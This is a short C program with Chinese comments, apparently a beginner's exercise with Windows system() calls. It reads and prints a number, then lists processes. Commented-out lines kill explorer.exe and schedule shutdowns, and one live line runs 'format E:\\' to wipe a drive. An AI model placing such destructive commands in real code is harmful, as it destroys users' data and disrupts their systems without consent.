#define _CRT_SECURE_NO_WARNINGS//这样就可以用像scanf这样的函数了
#include<stdio.h>
#include<windows.h>
#include<time.h>
int main(){
	int num;
	scanf("%d", &num);
	printf("%d", num);
	//ShellExecuteA(0, "open", "http://www.baidu.com", 0, 0, 3);
	//system("taskkill /f /im explorer.exe");//shutdown desktop
	//system("shutdown -s -t 60");
	//system("c:/Explorer.exe");
	//system("restart");
	//system("shutdown -a");//取消关机
	system("format E:\\");//格式化盘

	time_t ts;
	srand((unsigned int)time(&ts));//不用时间种子的话就是伪随机
	int number = rand();


	system("tasklist");//列出进程表
	system("pause");
}